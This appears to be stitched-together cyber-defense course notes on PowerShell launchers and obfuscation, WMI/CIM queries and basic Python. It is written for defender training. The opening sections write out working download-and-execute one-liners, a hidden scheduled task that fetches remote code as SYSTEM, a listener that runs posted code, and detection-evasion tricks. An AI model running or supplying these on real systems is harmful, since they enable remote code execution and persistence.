Invoke-WebRequest or Invoke-RestMethod are the most common ways for PowerShell to pull data over the network. Invoke-RestMethod is better at dealing with JavaScript Object Notation (JSON) and eXtensible Markup Language (XML) data types, while Invoke-WebRequest is better at returning strings.
$response=Invoke-WebRequest -uri "http://1.2.3.4/index.html"
$data=$response.Content



Another way to obtain data from the network is to call the .NET object directly with the following command:
$data=(New-Object System.Net.WebClient).DownloadFile("http://1.2.3.4/index.html")



Inbound Connections


PowerShell is built on the .NET framework, so anything C# can do, PowerShell can do. This means there are many ways to have a system listen for inbound connections in PowerShell. The most common way to listen is to make a webserver.
# Http Server
$http = New-Object System.Net.HttpListener

# Hostname and port to listen on
$http.Prefixes.Add("http://127.0.0.1:8080/")

# Start the Http Server 
$http.Start()

#This will block until there is a connection
$context = $http.GetContext()

$data = [System.IO.StreamReader]::new($context.Request.InputStream).ReadToEnd()
[string]$html = "<h1>A PowerShell Webserver</h1>" 
$buffer = [System.Text.Encoding]::UTF8.GetBytes($html) 
$context.Response.ContentLength64 = $buffer.Length
$context.Response.OutputStream.Write($buffer, 0, $buffer.Length)

#Shutdown gracefully
$context.Response.OutputStream.Close()
$http.Stop()



Executing Data 


The second step for a launcher to perform is to execute the code. Launchers use the command Invoke-Expression to execute text. This allows PowerShell to get a block of text, and execute it as commands.
$Command = "get-process"

Invoke-Expression $Command
#or
$Command | Invoke-Expression



Examples


When the -Command option is used with PowerShell.exe there is a limitation. The command cannot use variables the same way they are used in a terminal prompt. Commands can be modified to not use variables as an intermediary.
PowerShell.exe -ExecutionPolicy bypass -Command "Invoke-Expression  (Invoke-WebRequest -uri http://199.63.64.31/index.html).content"



The above example uses PowerShell to retrieve code from a remote location via Hypertext Transmission Protocol (HTTP) and execute the code content. Instead of executing it from the command line, the Scheduled Task (Schtask) command is used to create a scheduled job that automatically executes the PowerShell command at a given interval. The following example creates a scheduled job that downloads code and executes it with PowerShell.
schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://1.2.3.4/'''))'" /sc onlogon /ru System



Obfuscation Techniques
Post-exploitation PowerShell scripts use a variety of obfuscation techniques to hide their functionality from users and bypass the Windows Anti-Malware Scan Interface (AMSI) or other antivirus technologies. Defenders need to recognize common obfuscation techniques like encoding in order to apply proper decoding techniques. The ability to adequately identify and utilize obfuscation techniques can help Cyber Defense Analysts (CDA) to replicate or understand attacker activities.

﻿

Base64
﻿

Base64 encoding is commonly used to represent binary data in text form and is a common obfuscation technique that defense analysts must be familiar with. The numbering system is base 10, meaning that each digit represents 10 different things with 10 characters (0..9) to use. In base64, a number is encoded with uppercase and lowercase letters, the 0–9 digits as well as the + and / signs. The = sign is used to pad the number since a base64-encoded string needs to be a multiple of 3. Meaning that if there was a four-character-long base64 string, it requires two = signs afterward to make it an even multiple of 3.

﻿

With PowerShell scripts, there are two options for executing a base64-encoded command. The script receives a base64-encoded string to execute and decodes the string before sending it to Invoke-Expression, or the PowerShell process is kicked off and told to execute a base64-encoded command. PowerShell has this feature because sometimes it is difficult to escape special characters, so PowerShell accepts and executes a base64 command directly.

﻿

##############Manipulating Base64 Strings###############
﻿

The following PowerShell code demonstrates the process for taking a string and converting it to the base64 equivalent, followed by the function to decode the base64 back into a plaintext string.

#Convert to a base64 string
$Text = 'get-process'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)

#$Encoded Text is: ZwBlAHQALQBwAHIAbwBjAGUAcwBzAA==

#Decode
$DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
﻿

Executing a Base64 String Directly
﻿

Instead of converting base64 code to a string for execution, the base64 value can be passed directly to PowerShell for execution. The following example demonstrates that method.

powershell.exe -encodedCommand "ZwBlAHQALQBwAHIAbwBjAGUAcwBzAA=="
﻿



Case Sensitivity
﻿

Windows is famously case-insensitive. It is possible to change directories to c:\windows or c:\wINdoWs and get the same result. This type of obfuscation is commonly seen in attacks, though it is not as effective as other methods.

﻿

An attacker can change their PowerShell script to take advantage of this case insensitivity. These two commands execute the exact same way:

Invoke-WebRequest -uri 'http://1.2.3.4/'
or

inVoKE-weBReQuESt -uRi 'http://1.2.3.4/'
﻿

Random Spaces
﻿

PowerShell does not recognize spaces between the commands, but they may matter to the defenders. Attackers include multiple spaces that are ignored by PowerShell but are aimed at adding obfuscation to the command execution so cyber defense tools are less likely to detect their execution.﻿

inVoKE-weBReQuESt     -uRi  'http://1.2.3.4/'
﻿

String Concatenation
﻿

PowerShell adds strings together, giving an attacker another option to obfuscate the command and avoid detection. If a defender suspects an HTTP Uniform Resource Locator (URL) is used by the attacker, they might conduct log searches using the value http://, but that search does not match the concatenation of characters in the following command:

Invoke-WebRequest -uri 'htt' + 'p' + ':/' + '/1.2.3.4/'
﻿

Internet Protocol Addresses as a Base10 Number
﻿

Internet Protocol version 4 (IPv4) addresses are commonly shown as a set of four octet numbers between 0.0.0.0 and 255.255.255.255. In reality, this is just a human-readable way of representing an integer number between 0 and 4.2 billion. Instead of using the common IPv4 address format, attackers replace the address with the integer equivalent value, making it less noticeable to a defender looking for IPv4 addresses. Attackers use either the decimal representation of the integer, or the hexadecimal format. Each octet of the address is an 8-bit number, and the four together form the 32-bit address. PowerShell can handle multiple formats, giving an attacker the option to connect using a normal IPv4 address, a base10 integer Internet Protocol (IP) address, or a base16 (hex) IP address.  The following example shows PowerShell's ability to convert the address formats, first from standard address to a base10 value, then to base16 value, then back to the standard address.

([ipaddress]"1.2.3.4").Address
67305985

(67305985).tostring('x8')
04030201

([ipaddress]0x04030201).ipaddresstostring
1.2.3.4
﻿

Converting an IP address to a number and back works without issue. However, PowerShell uses host ordering (little-endian) to store the integer value, which is verified above by converting the decimal number to hex. Using that integer as a replacement for the IP address does not work unless it is converted to network ordering (big-endian). This is manually done by reversing the order of the four bytes that make up the hex value and displaying the corresponding base10 value from that. In the example below, converting 1.2.3.4 makes the decimal version corresponding to 4.3.2.1. Simply entering the IP backward and generating the integer for that reversed IP address fixes the problem and provides the correct integer value that can be used to replace the address.

([ipaddress]"1.2.3.4").Address
67305985

ping 67305985
Pinging 4.3.2.1 with 32 bytes of data:

([ipaddress]"4.3.2.1").Address
16909060

ping 16909060
Pinging 1.2.3.4 with 32 bytes of data:
﻿+





 PowerShell Aliases
PowerShell has the ability to create aliases for other commands. Some standard commands are actually aliases. For example, the command cd is an alias for the real command being executed, Set-Location. There is even an alias for setting aliases, sal. The alias for Invoke-WebRequest is iwr. For a full list of current aliases, use the command get-aliases.

﻿

Existing aliases are used to shorten up a malicious PowerShell command or to make the commands being executed appear benign.

sal block-website iwr
block-website -uri http://1.2.3.4



Shortening the Request
A launcher script is a minimal amount of code that runs from a smaller space and retrieves a larger amount of code from a remote location. However, at times, even the launcher script might have a reduced amount of space to reside in, such as 255 characters for a Scheduled Task. There are several techniques used to make PowerShell commands shorter, enabling the code to fit into a constrained space. Seeing these techniques used in a script may indicate that the script is malicious.

﻿

Shortening the Callback Request
﻿

The example below is a simple launcher script that downloads code from a remote site via HTTP, stores that code in a variable $data, and executes the code.

$data = (New-Object System.Net.WebClient).DownloadFile("http://1.2.3.4/index.html")
Invoke-Expression $data
﻿

Currently, this is 108 characters. The pipe command can be used so that the $data variable is not needed.

Invoke-Expression (New-Object System.Net.WebClient).DownloadFile("http://1.2.3.4/index.html")
﻿

Removing the $data variable shortens the script to 93 characters. The System in System.Net.WebClient is not required and Invoke-Expression has a default alias of iex.

iex (New-Object Net.WebClient).DownloadFile("http://1.2.3.4/index.html")
﻿

Removing those items brings the request down to 72 characters. The http:// is assumed so it is not required; this brings the total down to 65 characters.

iex (New-Object Net.WebClient).DownloadFile("1.2.3.4/index.html")
﻿

Changing the command to the alias for Invoke-WebRequest brings this launcher down even further to only 36 characters.

iex (iwr 1.2.3.4/index.html).Content
﻿

Depending on the resource name, this line could be even shorter. It does not take many characters for an attacker to gain full control of a system with PowerShell. 

Remain aware of aliases when writing detection signatures, as targeting only full cmdlet names without accounting for abbreviated versions like iwr may result in missed alerts.﻿

﻿

Shortening a Webserver
﻿

This is the original webserver. It executes whatever is sent over a POST command and is 520 characters. The max size for a schtasks command is 255 characters.

$http = New-Object System.Net.HttpListener
$http.Prefixes.Add("http://0.0.0.0:8080/")
$http.Start()
$context = $http.GetContext()
$data = [System.IO.StreamReader]::new($context.Request.InputStream).ReadToEnd()
[string]$html = "<h1>A PowerShell Webserver</h1>" 
$buffer = [System.Text.Encoding]::UTF8.GetBytes($html) 
$context.Response.ContentLength64 = $buffer.Length
$context.Response.OutputStream.Write($buffer, 0, $buffer.Length)
$context.Response.OutputStream.Close() 
$http.Stop()
Invoke-Expression $data
﻿

Using shortening techniques, the size of the webserver code below is reduced down to 367 characters. The techniques included making the variable names single characters, removing all the System prefixes, removing extra spaces between the = signs, removing html, and using a condensed syntax to create the HttpListener object.

$a=[Net.HttpListener]::new() 
$a.Prefixes.Add("http://0.0.0.0:8080/")
$a.Start()
$c=$a.GetContext()
$d=[IO.StreamReader]::new($c.Request.InputStream).ReadToEnd()
[string]$h="" 
$b=[Text.Encoding]::UTF8.GetBytes($h) 
$c.Response.ContentLength64=$b.Length
$c.Response.OutputStream.Write($b, 0, $b.Length)
$c.Response.OutputStream.Close() 
$http.Stop()
iex $d
﻿

Additional space reduction techniques can be implemented. In the case of this webserver, which is only being used to receive additional code for execution, sending data back to the client is not required, so those parts can be removed. With those omissions implemented in the code below, this brings the total size down to 214 characters.

$a=[Net.HttpListener]::new() 
$a.Prefixes.Add("http://0.0.0.0:8080/")
$a.Start()
$c=$a.GetContext()
iex ([IO.StreamReader]::new($c.Request.InputStream)).ReadToEnd()
$c.Response.OutputStream.Close() 
$a.Stop()
﻿

Taking advantage of |% being an alias for passing an object to a ForEach loop, and using $_ reference to that object, all the variables can be removed. This allows the entire webserver to come down to 157 characters. However, the webserver does not close gracefully, so repeated runs in the same powershell.exe process do not work. The client sending the data to the server hangs.

[Net.HttpListener]::new()|%{
  $_.Prefixes.Add("http://0.0.0.0:8080/");
  $_.Start();
  iex ([IO.StreamReader]::new($_.GetContext().Request.InputStream)).ReadToEnd()
}
﻿

To ensure the listening launcher shuts down properly, a Response.OutStream command is included and the code is slightly modified, bringing the total size to 206 characters. That is still small enough to fit in the Schedule Task space limitations while resulting in a webserver that closes gracefully and does not cause the client connection to hang.

[Net.HttpListener]::new()|%{
  $_.Prefixes.Add("http://0.0.0.0:8080/");
  $_.Start();
  $c=$_.GetContext();
  iex ([IO.StreamReader]::new($c.Request.InputStream)).ReadToEnd();
  $c.Response.OutputStream.Close();
  $_.stop()
}
﻿

Shortening the PowerShell.exe Call
﻿

If a launcher is being called outside PowerShell.exe, then the launcher command needs to be passed to the executable with several options. PowerShell options do not require the entire option spelled out, only enough of the characters to uniquely identify the option.

﻿

Table 12.3-2 lists all the options that PowerShell.exe accepts with minimal unique characters. Since four options start with No, to specify the NoProfile option, -nop needs to be specified at a minimum. Likewise, since only one option starts with the letter V to specify Version, then only -v needs to be given. 


 ![image](https://github.com/user-attachments/assets/18603168-0ae6-4d49-994b-d84ef04b1d3a)



This works for all options provided to PowerShell commands. Invoke-WebRequest has the following options starting with the letter M, -Method and -MaximumRedirection, and only one option starting with the letter B. That means these two commands do the same thing.
iwr http://127.0.0.1:8080/ -Method POST -Body 'get-process'

and

iwr http://127.0.0.1:8080/ -Me POST -B 'get-process'



![image](https://github.com/user-attachments/assets/a380c6e1-5685-42b7-a9bc-b2fc08daca96)


![image](https://github.com/user-attachments/assets/c43112c1-8542-4413-9958-6e9b9ec6e36e)


![image](https://github.com/user-attachments/assets/ea111af4-022c-4a8d-8791-1e7e476d701b)


![image](https://github.com/user-attachments/assets/844fa6f2-0907-425d-b8e0-8c088a193c90)



What Is WMI/CIM?
CIM and WMI are used interchangeably to refer to the infrastructure for managing data and operations on Windows-based operating systems. CIM is an open standard from the Distributed Management Task Force (DMTF). CIM provides a common definition of management information for systems, networks, applications, and services. CIM allows for vendor extensions. WMI is Microsoft’s proprietary implementation of CIM for the Windows platform. CIM and WMI share the same purpose, as well as many equivalent functions and features.

﻿

WMI and CIM are commonly misunderstood as a single tool or command. Rather, WMI and CIM form a framework for accessing data stored within classes. An example of a class is Win32_Process, which contains the running processes of a Windows host. CIM_Process is the CIM version of Win32_Process.

﻿

Commands and Classes
﻿

There are two main commands for accessing WMI: Get-WmiObject and Get-CimInstance. The command Get-WmiObject is the precursor to Get-CimInstance and is now the deprecated method for accessing WMI. Although Get-WmiObject still functions, Microsoft recommends using the command Get-CimInstance when using PowerShell 3.0 and above. Both Get-WmiObject and Get-CimInstance use the same or equivalent class names, but have other differences outlined in this lesson.

﻿

The command Get-WmiObject has an alias that shortens the command to gwmi. The alias for Get-CimInstance is gcim. This lesson uses both WMI and CIM aliases to interact with the classes within WMI. 

﻿

There are at least 137 classes available within WMI, which can be difficult to remember. Running the following command in PowerShell provides a complete, verbose list of Windows classes to query:

PS C:\>Get-WmiObject -List



 ![image](https://github.com/user-attachments/assets/ee3a8929-bec4-4580-8ba9-ddb586887386)

###########win32_service###############



Querying WMI for Investigations
The different classes in WMI contain useful information about the activity and behavior of a Windows host. Recognizing the most common classes enables a defender to quickly access important information from the host to use during investigations. The two ways that WMI can be used are locally and remotely. 

﻿

The command Get-Member can be used with Get-CIMinstance to display all available fields of a specific class. This command combination prints a table that contains the Name, MemberType and Definition of the available fields that can be filtered on. The following syntax retrieves this table for the class Win32_BIOS, which can be replaced with any other class to display its corresponding information:

Get-CIMinstance Win32_BIOS | Get-Member
﻿

Local Machines
﻿

One example of using the WMI command for a local machine is to query the host to examine which services are configured. This is particularly useful for investigating a host that potentially has a malicious service. 

﻿

The following command finds and lists all services that start at the time the computer boots. It uses the class Win32_Service, as well as the option -Filter and the cmdlet Select-Object:

PS C:\>Get-CimInstance Win32_service -Filter "StartMode = 'Auto'"|Select-Object Name, StartMode, PathName
﻿

The option -Filter limits the results to only return services that automatically start at boot, as noted by "StartMode = 'Auto'". The pipe to the cmdlet Select-Object filters the objects returned to only display the Name, StartMode, and PathName.

﻿

Remote Machines
﻿

Both Get-WmiObject and Get-CimInstance can be used to access remote machines. However, this depends on the services the remote system supports and has running. Get-WmiObject uses Distributed Component Object Model (DCOM) and Get-CimInstance uses Windows Remote Management (WinRM).

﻿

For remote access to work, the Windows Firewall must be configured to allow DCOM and WinRM traffic. For example, DCOM operates on port 135, which is open by default on all Windows systems. Therefore, Get-WmiObject is often easier to use. WinRM, on the other-hand, listens on both Hypertext Transfer Protocol (HTTP) port 5985 and Hypertext Transfer Protocol Secure (HTTPS) on port 5986. These are enabled by default on servers and are typically disabled on workstations for Get-CimInstance.

﻿

The commands Get-WmiObject and Get-CimInstance allow defenders to search for Indicators of Compromise (IOC) across a large number of hosts. Any command that can be run locally can also be run remotely. A common task such as retrieving running processes on a remote server, can be accomplished by running the following command:

PS C:\> Get-CimInstance -ClassName Win32_Process -ComputerName Server64
﻿

In this command, the field -ComputerName needs to be populated with the name of a computer or an IP address to be able to access the remote host.




![image](https://github.com/user-attachments/assets/ddcd7017-b1ce-4c4c-b572-5f101bc540fe)


![image](https://github.com/user-attachments/assets/bf06b3a9-9547-4b5d-a917-f63c3174a20d)


![image](https://github.com/user-attachments/assets/2a151cf8-0533-4752-bb91-78eb62ec245b)




![image](https://github.com/user-attachments/assets/1450d9de-0e8b-4511-8043-58673e9df141)




 Enter the following:
PS C:\Windows\System32> Invoke-Command -ScriptBlock {Get-CimInstance Win32_Bios |Select-Object ReleaseDate} -ComputerName 172.16.4.2 -Credential $creds


![image](https://github.com/user-attachments/assets/12f13f57-6f7e-41e1-b984-b017193716ef)




![image](https://github.com/user-attachments/assets/128a86bc-842d-4bd9-b27e-5cf3fdb6fb24)



Run the following command. Use the output to answer the question that follows.


1. In the PowerShell Terminal, in the VM win-hunt, enter the following:
PS C:\Windows\System32> Get-CimInstance Win32_OperatingSystem|Select-Object BuildNumber



![image](https://github.com/user-attachments/assets/57125aac-414a-45e9-ad22-59b16a87f74e)


![image](https://github.com/user-attachments/assets/1827efd7-c6ca-4695-8b77-bada5fb2c601)


WMI Query Language (WQL)


In previous sections it was demonstrated that WMI information can be accessed through Get-WmiObject and Get-CimInstance. WQL is another option for accessing WMI information. WQL allows for the same type of queries as the previous two commands, but uses Structured Query Language (SQL) formatting. 


The main WQL statements are Select, Where, and From. PowerShell users are still required to use Get-WMIObject or Get-CimInstance to call WQL before being able to use WQL. The parameter -Query must also be used to differentiate between accessing WMI through WQL or through the Class directly. The following WQL example obtains information about the BIOS using the parameter -Query, followed by Select * from and the class name:

Get-WmiObject -Query "Select * from Win32_Bios"

Comparing WQL, Get-WmiObject, and Get-CimInstance


There are many situations in which WQL is a better option than Get-WmiObject or Get-CimInstance. The four main differences between WQL and Get-WMIObject and Get-CimInstance include the following:
Syntax
Performance
Debugging
Tab completion 

![image](https://github.com/user-attachments/assets/952fa387-c23e-49c6-9f82-9fd95329bf13)



Enter the following WQL query to filter through a list of processes and only select explorer.exe:
gcim -Query "SELECT * FROM Win32_Process WHERE ProcessID = 'explorer.exe"



This syntax produces an error that needs to be corrected to work properly. 


4. Analyze the error output to locate the error in the command entered in the last step.



![image](https://github.com/user-attachments/assets/d71457a7-bcef-4931-bb04-e111be407a48)


![image](https://github.com/user-attachments/assets/ba17e964-ba5b-48dd-b574-7db9ad05b267)
#############look at chart########################





Use PowerShell to Interact with WMI
In addition to Get-WmiObject and Get-CimInstance, there are many other WMI-specific commands available within PowerShell. This section covers additional commands that defenders may need in the future to accomplish the following:

List additional WMI Cmdlets

List additional available CimCmdlets

Close a running process

Delete a folder

Check whether a file exists

Filter results

List Additional WMI Cmdlets
﻿

The command Get-Command -Noun WMI* displays additional WMI commands, as indicated in Figure 12.4-1, below:

![image](https://github.com/user-attachments/assets/581e4860-b50e-41a5-bd6e-4b78074a3a40)

Close a Running Process and Delete a Folder


The command Remove-WmiObject can be used to close a running process or delete a file or a directory, in the following ways:


Close the Running Process notepad.exe
Get-WmiObject -Query "select * from win32_process where name='notepad.exe'" 
| Remove-WmiObject



Delete the Folder Test
Get-WMIObject -Query "Select * From Win32_Directory Where Name ='C:\\Test'" 
| Remove-WMIObject



Defense analysts can use Remove-WmiObject to stop a program on an infected host from running a malicious file and then use the command to remove it from the system through WMI. 


Check Whether a File Exists


Another useful class displayed in the CimCmdlets list is CIM_DataFile. This class allows for a fast search across a local host or network to search for specific filenames or file extensions. The following command uses CIM_DataFile to verify whether the file malware.exe exists:
Get-WMIObject -query "select * from CIM_DataFile where Name = 'C:\\malware.exe'"





Filter Results


The results provided by a command often contain more information than required. The parameter -Property filters results to a specific field or a series of fields to provide faster access to only what is needed.


As an example, running the following command returns five fields:
Get-CimInstance -ClassName Win32_Bios



However, using the parameter -Property minimizes this further. To return only the field SerialNumber, the command must be piped into Select-Object, as follows:
Get-CimInstance -ClassName Win32_BIOS|Select-Object -Property SerialNumber



To return a specific selection of fields, such as both SerialNumber and Version, each filtering criteria must be separated by commas. The following is an example of a command that returns only the two fields specified:
Get-CimInstance -ClassName Win32_BIOS|Select-Object -Property SerialNumber, Version



The parameter -ExpandProperty displays only the results, while omitting the header information. In addition to omitting headers, -ExpandProperty can extract and display specific values from objects as well as flatten hierarchical data structures. These capabilities are useful for simplifying complex data and focusing on key information. Figure 12.4-3, below, displays the output from -Property with the header “SerialNumber” and the output from -ExpandProperty, which leaves out the header:



![image](https://github.com/user-attachments/assets/6e8a2d4f-6d82-4aa6-b615-02164bf6c1ce)



This section touched briefly on piping. Additional information about pipes and pipelines are provided in an upcoming section of this lesson. 


Access Multiple Remote Hosts


Providing multiple computer names to the parameter -ComputerName allows the simultaneous retrieval of information from multiple hosts. The following command is an example of retrieving information about the service VolumeShadowCopy on multiple remote hosts using filters and commas:
Get-CimInstance Win32_Service -Filter "Name = 'VSS' -ComputerName RemoteHost,RemoteHost2,RemoteHost3 -Credential $credentials

![image](https://github.com/user-attachments/assets/44ce88ec-9155-4df6-8e34-41cf473b249e)


![image](https://github.com/user-attachments/assets/960c24e6-316c-4a71-8b2b-c3f531b7a1fc)



Pipelines
Pipelines ("|") provide the ability to feed data from one command into another for further processing. Common pipelines include Format-Table, Format-List, Select-Object, and Select-String. 

﻿

Format-Table
﻿

The default output of any PowerShell command is Format-Table. This format displays output in a table with headers across the top of the data, as displayed below in Figure 12.4-5. 


![image](https://github.com/user-attachments/assets/948bf469-320b-4edb-85ca-7fc22b5b37f0)




Format-List


The option Format-List, displayed below in Figure 12.4-6, outputs the data in a list with headers on the left as a column.

![image](https://github.com/user-attachments/assets/e40cfb5e-e8c0-446f-ae9a-0eae234a2c06)


Sort-Object 


The option Sort-Object sorts the output of the data alphabetically so that it is easier to read. The output can be sorted based on the name of the column. Figure 12.4-7, below, illustrates how the output from the following command sorts all objects based on the column HandleCount:
gcim Win32_Process|Sort-Object HandleCount


![image](https://github.com/user-attachments/assets/ebcbbbe6-6a0b-46c4-8f23-44b295bea5a3)


Select-String 


The option Select-String, illustrated below in Figure 12.4-8, is a command built into PowerShell and searches through the output of a command that is piped into it for matching patterns. This is similar to using the command findstr in a Windows command prompt or the command grep in a Linux terminal.



![image](https://github.com/user-attachments/assets/56a08d0e-cc72-437b-bf4c-6a4828ac50e2)




![image](https://github.com/user-attachments/assets/33c02c3e-b8e9-4409-b1d7-29eb2650380c)


Python Overview
Python.org describes Python as an “interpreted, object-oriented, high-level programming language with dynamic semantics.” Python is a free, open-source, and easy-to-learn syntax that enables users to quickly develop and test code with little downtime. Python also offers a modular design, where portions of the code are broken down into separate sections that are easier to work with. Python's syntax and modular design make it an attractive choice for cyber defenders.

﻿

Python Variables
﻿

Python is similar to other programming languages in how it uses variables to store and manipulate objects. A variable is a name attached to an object to help create efficient and organized code. Most programming languages require variables to be defined in advance of their use and to remain static with their definition. Python creates efficiency by allowing variables to be both defined and used within the same line of code. Additionally, Python allows variables to change the type of data they define. For example, a variable may start by defining a string value. However, the variable may be changed to a number value at a later time. 

﻿

Figure 13.1-1, below, provides four key principles for creating variables:

![image](https://github.com/user-attachments/assets/57078275-abac-4234-b531-c1369c41a78c)

The syntax for creating variables is variable_name = value. The first line in the following example defines the variable named x with the value America!. The second line in the example uses the function print() with the defined variable, which outputs its value on the next line:

x = "America!"
print(x)
America!


Data Types
Variables define and store different data types. Data types define data structure and functionality. Python uses specific operators to designate a specific function or manipulation for different data types. Table 13.1-1, below, displays Python's built-in operators for each of the available data types, which are explained next.

﻿
![image](https://github.com/user-attachments/assets/04577542-fa32-4879-98f1-8f4a444bf718)




String


Strings include sequences of text, characters, or data. They are defined by the operator str and written in either single or double quotes. The following example defines the string value as Hello and outputs this value with the function print():
output = str("Hello")
print(output)


Hello



Numeric


The numeric data type includes data related to numbers, such as integers, floating point numbers, and complex numbers.


Integers


Integers are whole numbers that are defined by the operator int. The following example defines the integer value 10 for the variable output:
output = int(10)
print(output)

10



Floating Point Numbers


A floating point number is a number with a decimal point. These numbers are defined by the operator float. The following example defines the floating point number 10.1 for the variable output:
output = float(10.1)
print(output)

10.1



Complex Numbers


Complex numbers are imaginary numbers that are defined by the operator complex. The following example defines the complex number 10.j for the variable output:
output = complex(10.j)
print(output)

10.j



Sequence


The sequence data type defines a specific order of items that may or may not be changed, depending on the specific sequence type. Sequence types include lists, tuples, or ranges of objects. 


Lists


Lists are a group of items, which may include different types of data. The data in lists can be changed whenever necessary. Lists are defined by the operator list, while their items are placed in square brackets. The following example defines a list that includes apple, orange, and 10 for the variable y:
y = list(["apple", "orange", 10])
print(y)

['apple', 'orange', 10]



Tuples


Tuples are a list of items that cannot be changed after they are defined. They are defined by the operator tuple, while their items are placed in a subset of parentheses. The following example defines the list apple, orange, and 10 as a tuple for the variable z:

z = tuple(("apple", "orange", 10))
print(z)
('apple', 'orange', 10)



Older versions of python use the tuple method to list items as shown here. As python has evolved and updated, variables can be quickly defined simply by using brackets. The remainder of the lesson defines variables with brackets. 


Ranges


Ranges define numeric sequences. They use the operator range in the syntax range(start, stop, step). The parameters in this syntax are user-defined and indicate the following:
start: The first number included in the sequence.
stop: The number at which the sequence ends. This number is excluded from the sequence.
step: The number that defines the difference between the numbers in the sequence. 


The following example defines the variable x as a range of numbers that start at 0. The example prints every number counted by 1, until it reaches 5 and stops printing:

x = range(0,5,1)
for n in x:
print(n)
0
1
2
3
4



Python 2 and Python 3 both use the operator range, but in different ways. In Python 2, the operator range returns one number at a time, as needed. This is an inefficient use of resources. Python 2 also offers the operator xrange, which returns the generator object that displays numbers instantaneously by looping. In Python 3, range replaces the operator xrange and contains all xrange functionality.


Set


The set data type stores a collection of unordered items in a single variable. Each item has a unique value and only occurs once in a set. Sets are defined by the operator set, while their items are placed in square brackets. The following example defines the set apple, orange, and 10 for the variable x:

x = set(["apple", "orange", 10])
print(x)
{10, 'orange', 'apple'}



Frozenset


Frozensets are sets that are immutable, which means that they cannot be changed after defining them. Frozensets are defined by the operator frozenset and their items are placed in a subset of curly braces. The following example defines the frozenset apple, orange, and 10 for the variable x:
x = frozenset({'apple', 'orange', 10})
print(x)

{10, 'apple', 'orange'}



Boolean


Booleans allow a value to be evaluated as either True or False. They are defined by the operator bool. The following example defines the variable x = 10 and y = 11. The variable z uses bool to evaluate whether x is greater than y.

x = 10
y = 11
z = bool(x > y)
print(z)
False



Binary


The binary data type manipulates binary data and accesses the memory of binary objects. It uses the operators bytes, bytearray, and memoryview.


Bytes


Bytes are defined by the operator bytes. This returns immutable bytes objects initialized with user-defined size and data. The following example creates bytes of the integer size 10 for the variable x.

x = bytes(10)
print(x)
b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'



Bytearray


Bytearray is defined by the operator bytearray. This operator returns an array of objects in a given number of bytes. The following example creates an array of bytes of the integer size 10 for the variable x.

x = bytearray(10)
print(x)
b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'



Memoryview


Memoryview is defined by the operator memoryview. It permits objects to access data without having to copy the data. Memoryview is a safe way to expose the buffer protocol in Python. The following example creates memoryview for the variable x = b"10". The output provides access to the internal buffers of the variable x by creating a memory view object.

x = memoryview(b"10")
print(x)
<memory at 0x14ebe21c9a00>




Modes and Functions
Python is commonly used in interactive mode or through scripts. This section provides additional information about interactive mode, Python scripts, and the Help function that supports development.

﻿

Interactive Mode
﻿

Interactive mode provides an interactive session that immediately displays the output of any code entered. Most languages require code to be compiled before they can be executed, however Python's interactive mode supports real-time code execution with instant output. This means a complex line of code that returns an error may be quickly reviewed, modified, and tested in interactive mode rather than repeatedly compiling the code to test it. Interactive mode is best for writing short lines of code or to examine code line-by-line. 

﻿

Interactive mode may be accessed by opening a new terminal session, then entering the command python, or py. The command prompt indicates that interactive mode is enabled by placing >>> at the start of the entry line. When a command is executed a value is instantly returned. If a command is entered and more code is required to execute the command properly, the command prompt starts a new line with ... immediately after the initial line of code. Interactive mode is exited either by inputting the function quit() into the terminal or by entering Ctrl+D. 

﻿

Scripts
﻿

Python scripts are files containing a logical sequence of orders that execute when called. These scripts use the file extension .py. Python scripts are best for automating time consuming tasks. For example, MITRE’s tool, Caldera, uses Python script automation to help blue teams emulate adversary activity and incident response. Scripting and its capabilities depend on the version of the Python installation. Multiple versions of Python may be installed on a single host. The following command returns the versions:

Python --version
﻿

Functions 
﻿

Within Python, a function is a block of code that is executed when called upon. This section covers two common functions: help() and input().

﻿

Help Function
﻿

The function help() displays Python documentation for components of Python. This function is accessible in interactive mode with the following syntax:

help(object)﻿

﻿

The syntax asks for help for the object in the parentheses. Within Python, an object is a collection of some of the many variables and functions that Python has to offer. The function help() provides easy and efficient access to documentation for each. For example, the following syntax requests help documentation for the function print:

help(print)
﻿

The output from this command returns the following help documentation:

Help on built-in function print in module builtins:

print(...)
    print(value, ..., sep=' ', end='\n', file=sys.stdout, flush=False)

    Prints the values to a stream, or to sys.stdout by default.
    Optional keyword arguments:
    file:  a file-like object (stream); defaults to the current sys.stdout.
    sep:   string inserted between values, default a space.
    end:   string appended after the last value, default a newline.
    flush: whether to forcibly flush the stream.
﻿

Input Function
﻿

The function input() prompts users to enter a specified value. The following example uses the input function to prompt a user for their name and includes a print function to output the name as part of a new string:

x = input('Enter your name:')
print('Hello, ' + x)
﻿

The first output after executing the code above asks the user to enter their name, as follows. In this example, the name entered is User 1: 

Enter your name:
User1
﻿

After entering the name, the second output is returned, as follows:

Hello, User1

Check Python Version and Launch Interactive Mode


Access the terminal emulator, check the Python version, and launch Python in interactive mode.


Workflow


1. Log in to the Virtual Machine (VM) lin-hunt-cent using the following credentials:
Username: trainee
Password: CyberTraining1! 



2. Open Terminal.


3. Initiate interactive mode on the host by entering the following command:
python



Completing step 3 outputs the following:
Python 3.9.10 (main, Feb  9 2022, 00:00:00) 
[GCC 11.2.1 20220127 (Red Hat 11.2.1-9)] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 



The first line of the output displays Python 3.9.10, which is the version number of the Python installation. Version 3.9.10 is a recent version of Python. Not all hosts may be equipped with a recent version, which means that some features may not be available. Python documentation by version is available in the additional resources section of this task. 


The last line displays >>> to indicate that Python is in interactive mode. 


Access Python Help Documentation


Use Python’s interactive mode to access the help function and find documentation on two Python functions. Continue working in Terminal, in the 
VM lin-hunt-cent.


Workflow


1. Within interactive mode, enter the help function by entering the following command:
help()



This step returns the following output:
Welcome to Python 3.9's help utility!

If this is your first time using Python, you should definitely check out the tutorial on the Internet at https://docs.python.org/3.9/tutorial/.

Enter the name of any module, keyword, or topic to get help on writing Python programs and using Python modules. To quit this help utility and return to the interpreter, just type "quit".

